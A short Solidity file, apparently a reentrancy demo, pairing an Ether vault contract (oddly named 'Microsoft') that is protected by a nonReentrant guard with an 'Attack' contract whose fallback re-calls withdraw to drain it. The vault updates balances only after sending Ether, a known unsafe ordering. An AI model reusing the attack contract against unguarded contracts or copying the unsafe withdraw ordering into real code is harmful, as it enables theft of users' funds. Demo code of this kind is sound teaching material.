pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol";


contract Microsoft is ReentrancyGuard{
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() nonReentrant public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);
         
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
       
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
contract Attack {
    Microsoft public exploit;

    constructor(address _exploitAddress) {
        exploit = Microsoft(_exploitAddress);
    }
     fallback() external payable {
        if (address(exploit).balance >= 1 ether) {
            exploit.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        exploit.deposit{value: 1 ether}();
        exploit.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
